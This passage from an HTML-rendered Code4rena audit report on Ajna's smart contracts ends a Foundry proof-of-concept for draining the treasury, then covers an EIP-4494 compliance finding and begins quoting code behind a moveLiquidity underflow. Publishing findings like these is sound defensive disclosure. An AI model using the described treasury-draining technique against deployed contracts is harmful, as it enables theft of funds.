class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // The attacker can continue requesting (1- MiniumThreshold)% of the treasury until threshold becomes 100%.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function _delegateToDelegatees(IAjnaToken token_, address delegator_, address delegatee_) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    changePrank(delegator_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    token_.delegate(delegatee_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function _delegateTo(IAjnaToken token_, address[] memory delegators_, address[] memory delegatees_) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    for (uint256 i = 0; i &lt; delegators_.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _delegateToDelegatees(token_, delegators_[i], delegatees_[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>}</p>\n</li>\n<li>Run <code>forge test --match-contract ExploitEF --match-test test_drainTreasury</code></li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Re-write the constraint as follows:</p>\n<p><code>votesReceived >= _getSliceOfNonTreasury(percentageOfTreasuryTokensRequested) + _getSliceOfNonTreasury(minThresholdPercentage)</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/164#issuecomment-1569224507\">Picodes (judge) decreased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/164#issuecomment-1571157401\">ith-harvey (Ajna) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>We removed the EFM.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-13--positionmanager--permiterc721-failure-to-comply-with-the-eip-4494\" style=\"position:relative;\"><a href=\"#m-13--positionmanager--permiterc721-failure-to-comply-with-the-eip-4494\" aria-label=\"m 13  positionmanager  permiterc721 failure to comply with the eip 4494 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/141\">[M-13]  <code>PositionManager</code> &#x26; <code>PermitERC721</code> Failure to comply with the EIP-4494</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/141\">Haipls</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L42\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L42</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/PermitERC721.sol#L77\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/PermitERC721.sol#L77</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/PermitERC721.sol#L13\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/PermitERC721.sol#L13</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L57\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L57</a></p>\n<p>The contract <code>PositionManager.sol</code> inherits from <code>PermitERC721.sol</code>, but both contracts incorrectly implement the <code>EIP-4494</code> standard, which is an important part of the contract. This leads to the following issues:</p>\n<ul>\n<li><code>PositionManager</code> &#x26; <code>PermitERC721</code> are not <code>EIP-4494</code> compliant</li>\n<li>Automatic tools will not be able to determine that this contract has a <code>permit</code> for <code>ERC721</code></li>\n<li>Third-party contracts will not be able to determine that this is <code>EIP-4494</code></li>\n<li>Inability to correctly track which <code>nonces</code> are currently relevant, leading to the creation of invalid signatures/signatures for the future</li>\n<li>No support for compact signatures</li>\n</ul>\n<h3 id=\"proof-of-concept-22\" style=\"position:relative;\"><a href=\"#proof-of-concept-22\" aria-label=\"proof of concept 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>According to the specifications of the standard <a href=\"https://eips.ethereum.org/EIPS/eip-4494\">EIP-4494</a>, the following violations were found:</p>\n<ol>\n<li><code>EIP-4494</code> requires the implementation of <code>IERC165</code> and the indication of support for the interface <code>0x5604e225</code>, <strong>which is not implemented</strong></li>\n<li><code>EIP-4494</code> requires the presence of the function <code>function nonces(uint256 tokenId) external view returns(uint256);</code> <strong>which is missing</strong></li>\n<li><code>EIP-4494</code> requires the function <code>function permit(address spender, uint256 tokenId, uint256 deadline, bytes memory sig) external;</code>, <strong>which is incorrectly declared</strong> as</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">05</span><span class=\"mtk1\">-</span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">base</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">PermitERC721</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">permit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">78:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">spender_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deadline_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">v_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">r_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">79:     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<h3 id=\"tools-used-11\" style=\"position:relative;\"><a href=\"#tools-used-11\" aria-label=\"tools used 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<ul>\n<li>Manual review</li>\n<li>Foundry</li>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-4494\">https://eips.ethereum.org/EIPS/eip-4494</a></li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>Correct the identified non-compliance issues so that the contracts meet the standard</li>\n<li>Or remove references to the standard and provide a reference to the Uniswap V3 implementation</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/141#issuecomment-1555088600\">MikeHathaway (Ajna) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/141#issuecomment-1570263947\">Picodes (judge) decreased severity to Low and commented</a>:</strong></p>\n<blockquote>\n<p>Downgrading to Low as part of this is out of scope here, and the rest can be considered an instance of “function incorrect as to spec”</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/141#issuecomment-1570822000\">Haipls (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Hi @Picodes - The <code>ajna-core/src/base/PermitERC721.sol</code> is indeed out of scope, which subsequently makes points <code>1</code> and <code>3</code> out of scope as well. However, I’d like you to take another look at point <code>2</code>.</p>\n<blockquote>\n<p>EIP-4494 necessitates the inclusion of the function: <code>function nonces(uint256 tokenId) external view returns(uint256);</code> which is currently absent.</p>\n</blockquote>\n<p>We can see that <code>PermitERC721</code> is an abstract contract which only partially implements EIP-4494, and it does so incorrectly, thereby making this part out of scope. However, it also imposes a requirement (abstract contract with abstract <code>_getAndIncrementNonce()</code> method) on <code>PositionManager</code> to implement <code>nonces</code> method on its end, <strong>which is within scope</strong>. This conclusion can be drawn from the following method:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"c\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: ajna-core/src/base/PermitERC721.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">29</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">/** @dev Gets the current nonce for a token ID and then increments it, returning the original value */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">30</span><span class=\"mtk1\">:    function </span><span class=\"mtk11\">_getAndIncrementNonce</span><span class=\"mtk1\">(uint256 </span><span class=\"mtk12\">tokenId_</span><span class=\"mtk1\">) internal virtual </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (uint256);</span></span></span></code></pre>\n<p>This suggests that the <code>nonces</code> method must be implemented in <code>PositionManager</code>, <em>PermitERC721 transfers this responsibility to descendants</em>. And according to point 2, <code>PositionManager</code> is the final contract that violates the <code>EIP-4494</code> standard, which is indeed within scope. According to <a href=\"https://eips.ethereum.org/EIPS/eip-4494\">EIP-4494</a> documentation, the <code>nonces</code> declaration is stated under <strong>Three new functions MUST be added to ERC-721</strong>:, which, in my opinion, can’t be simply dismissed as <code>function incorrect as to spec</code>. According to the practice I’ve observed, any violation of the standard with <code>MUST label</code> is usually rated as <code>Medium</code>.</p>\n<p>Examples:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/638\">https://github.com/code-423n4/2023-02-ethos-findings/issues/638</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/44\">https://github.com/code-423n4/2023-04-caviar-findings/issues/44</a></li>\n<li>etc…</li>\n</ul>\n<p>Thank you.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/141#issuecomment-1575702153\">Picodes (judge) increased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>@Haipls - your point is valid: <code>PositionManager</code> should implement <code>nonces</code>. I was reluctant to give this Medium severity as there are issues in <code>PermitERC721</code> so the contract couldn’t implement the EIP anyway, but, after reflection and discussing it with another judge, the problem is significant enough to justify Medium severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-14-positionmanagermoveliquidity-could-revert-due-to-underflow\" style=\"position:relative;\"><a href=\"#m-14-positionmanagermoveliquidity-could-revert-due-to-underflow\" aria-label=\"m 14 positionmanagermoveliquidity could revert due to underflow permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/99\">[M-14] <code>PositionManager.moveLiquidity</code> could revert due to underflow</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/99\">0xnev</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/261\">mrpathfindr</a> and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/97\">0xnev</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L320\">PositionManager.sol#L320</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">moveLiquidity</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MoveLiquidityParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mayInteract</span><span class=\"mtk1\">(params_.pool, params_.tokenId) </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MoveLiquidityLocalVars</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// handle the case where owner attempts to move liquidity after they&#39;ve already done so</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemovePositionFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// ensure bucketDeposit accounts for accrued interest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateInterest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// retrieve info of bucket from which liquidity is moved  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bankruptcyTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketDeposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">bucketInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// check that bucket hasn&#39;t gone bankrupt since memorialization</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bankruptcyTime</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BucketBankrupt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// calculate the max amount of quote tokens that can be moved, given the tracked LP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxQuote</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_lpToQuoteToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketDeposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketDeposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_priceAt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">EnumerableSet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">UintSet</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positionIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// remove bucket index from which liquidity is moved from tracked positions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\">.</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemovePositionFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update bucket set at which a position has liquidity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// slither-disable-next-line unused-return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// move quote tokens in pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountFrom</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountTo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">moveQuoteToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxQuote</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span 